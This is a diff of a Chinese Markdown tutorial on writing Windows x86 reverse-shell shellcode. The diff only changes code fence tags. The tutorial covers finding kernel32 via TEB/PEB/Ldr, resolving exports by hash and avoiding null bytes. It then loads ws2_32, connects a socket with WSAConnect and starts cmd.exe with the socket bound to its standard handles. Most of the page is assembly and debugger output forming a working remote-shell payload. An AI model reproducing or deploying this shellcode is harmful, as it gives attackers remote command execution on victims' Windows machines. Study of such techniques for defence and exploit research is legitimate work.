@@ -6,7 +6,7 @@ layout: default
 ### 查找kernel32.dll基址
 > ==通过TEB->PEB->Ldr来获取到kernel32.dll基址.==
 1. 通过TEB得到PEB
-```c
+```
 0:000> dt !_teb @$teb
 ntdll!_TEB
    +0x000 NtTib            : _NT_TIB
@@ -20,7 +20,7 @@ ntdll!_TEB
 ```
 
 2. 通过PEB得到Ldr
-```c
+```
 0:000> dt !_PEB 0x0022e000 
 ntdll!_PEB
    +0x000 InheritedAddressSpace : 0 ''
@@ -41,7 +41,7 @@ ntdll!_PEB
 ```
 
 3. Ldr信息
-```c
+```
 0:000> dt !_PEB_LDR_DATA  0x770c6c00 
 ntdll!_PEB_LDR_DATA
    +0x000 Length           : 0x30
@@ -62,7 +62,7 @@ ntdll!_LIST_ENTRY
    +0x004 Blink            : 0x005331b8 _LIST_ENTRY [ 0x770c6c1c - 0x533508 ]
 ```
 > 补充
-```c
+```
 ########################list_entry获取数据位置########################
 #define list_entry(ptr, type, member) ((type *) ((char *) (ptr) - (unsigned long) (&((type *) 0)->member)))
 
@@ -75,7 +75,7 @@ member	:	这是TYPE对象中list_head型变量的变量名
 然后使用ptr-offset		:	数据真实基址.
 ```
 4. _LDR_DATA_TABLE_ENTRY
-```c
+```
 _LIST_ENTRY中的数据为_LDR_DATA_TABLE_ENTRY.
 因为0x532ce0是InInitializationOrderModuleList的地址. InInitializationOrderLinks在_LDR_DATA_TABLE_ENTRY中偏移为0x10,所以地址-0x10.
 
@@ -104,7 +104,7 @@ ntdll!_UNICODE_STRING
 所以ntdll!_LDR_DATA_TABLE_ENTRY + 0x2C + 0x04 = BaseDllName
 ```
 5.  查找kernel32.dll基址代码
-```c
+```
 	find_kernel32:
 		xor ecx, ecx					;	ECX = 0
 		mov esi, fs: [ecx + 30h]		;	ESI = PEB
@@ -124,7 +124,7 @@ ntdll!_UNICODE_STRING
 ### 查找函数
 > ==通过PE头查找到导出表,遍历导出表找到想要的函数.==
 1. DOS头信息
-```c
+```
 0:000> dt _IMAGE_DOS_HEADER 76a60000 
 ntdll!_IMAGE_DOS_HEADER
    +0x000 e_magic          : 0x5a4d
@@ -148,7 +148,7 @@ ntdll!_IMAGE_DOS_HEADER
    +0x03c e_lfanew         : 0n256
 ```
 2. PE头信息
-```c
+```
 0:000> dt _IMAGE_NT_HEADERS 76a60000 + 0x100
 ntdll!_IMAGE_NT_HEADERS
    +0x000 Signature        : 0x4550
@@ -156,7 +156,7 @@ ntdll!_IMAGE_NT_HEADERS
    +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
 ```
 3. OptionalHeader
-```c
+```
 0:000> dt _IMAGE_OPTIONAL_HEADER 76a60000 + 0x100 + 0x18
 ntdll!_IMAGE_OPTIONAL_HEADER
    +0x000 Magic            : 0x10b
@@ -192,7 +192,7 @@ ntdll!_IMAGE_OPTIONAL_HEADER
    +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY
 ```
 4. 导出表信息
-```c
+```
 0:000> dt _IMAGE_DATA_DIRECTORY 76a60000 + 0x100 + 0x78
 ntdll!_IMAGE_DATA_DIRECTORY
    +0x000 VirtualAddress   : 0x809a0
@@ -222,7 +222,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
     直接用函数序数-基数=EAT索引,直接用索引查找EAT表即可.
 ```
 5. 导出表函数名需要进行匹配,这里使用一种HASH算法使函数名转换为DWORD.
-```c
+```
 	compute_hash :
 		xor eax, eax					; NULL EAX
 		cdq								; NULL EDX CDQ（Convert Double to Quad的缩写，将双字数据扩展为四字）把EDX的所有位都设成EAX最高位的值
@@ -239,7 +239,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 	compute_hash_finished :
 ```
 6. 查找函数代码
-```c
+```
 	find_function:
 		pushad                          ; save registers   
 		mov eax, [ebx + 0x3c]		    ; offset to PE
@@ -282,14 +282,14 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 ### 避免0x00
 > ==在一些指令中会出现0x00字节,需要处理掉这些字节==
 1. 算数运算
-```c
+```
 81ec00020000   sub   esp,200h  ===>  81c4f0fdffff   add   esp,0FFFFFDF0h
 ```
 2. CALL相对地址调用
 > ==只要被调用的函数地址小于调用者则会使用负数偏移,大概率不会产生0x00字节==
 3. CALL绝对地址调用
 > ==动态查找绝对地址保存到寄存器,然后CALL Registers==
-```c
+```
      find_function_shorten:               
        jmp find_function_shorten_bnc   ;     Short jump
        
@@ -313,7 +313,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 2. 得到LoadLibraryA地址.(用于加载ws2_32.dll)
 3. 加载ws2_32.dll
 > LoadLibraryA需要一个String参数. ws2_32.dll = 77 73 32 5f 33 32 2e 64 6c 6c 使用栈传递字符串参数
-```c
+```
 	load_ws2_32:
 		xor eax, eax;
 		mov ax, 0x6c6c             ; 字符串参数
@@ -324,7 +324,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 		call dword ptr[ebp + 0x14] ; Call LoadLibraryA
 ```
 4. 得到WSAStartup地址
-```c
+```
 	resolve_symbols_ws2_32 :
 		mov ebx, eax                ; 保存 ws2_32.dll 基址
 		push 0x3bfcedcb             ; WSAStartup hash
@@ -340,7 +340,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 		mov[ebp + 0x24], eax        ; 保存 WSAConnect 地址
 ```
 6. 调用WSAStartup
-```c
+```
 	int WSAStartup(
 	  WORD      wVersionRequired,
 	  LPWSADATA lpWSAData
@@ -368,7 +368,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 		call dword ptr[ebp + 0x1c]  ; CALL WSAStartup
 ```
 6. 调用WSASocketA
-```c
+```
 	SOCKET WSAAPI WSASocketA(
 	  int                 af,               //AF_INET (2)
 	  int                 type,             //SOCK_STREAM (1)
@@ -392,7 +392,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 		call dword ptr[ebp + 0x20]  ; CALL WSASocketA
 ```
 7. 调用WSAConnect
-```c
+```
 	int WSAAPI WSAConnect(
 	  SOCKET         s,             // WSASocketA ret
 	  const sockaddr *name,
@@ -455,7 +455,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 		call dword ptr[ebp + 0x24]      ; CALL WSAConnect
 ```
 8. 调用  CreateProcessA
-```c
+```
 	BOOL CreateProcessA(
 	  LPCSTR                lpApplicationName,      // cmd.exe
 	  LPSTR                 lpCommandLine,          // 
@@ -498,7 +498,7 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 	} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
 ```
 8.1 初始化 STARTUPINFOA
-```c
+```
 create_startupinfoa :
 		push esi                   ; hStdError  = socket
 		push esi                   ; hStdOutput = socket
@@ -528,7 +528,7 @@ create_startupinfoa :
 		pop edi                    ; edi = &STARTUPINFOA
 ```
 8.2 初始化cmd.exe字符串
-```c
+```
 	create_cmd_string:
 		mov eax, 0xff9a879b ; not 0x00657865 = 0xff9a879b
 		neg eax             ; not 0xff9a879b = 0x00657865 规避0x00
@@ -538,7 +538,7 @@ create_startupinfoa :
 		pop ebx             ; ebx = &"cmd.exe"
 ```
 8.3 创建进程
-```c
+```
 	call_createprocess:
 		mov eax, esp               ; 
 		xor ecx, ecx               ;
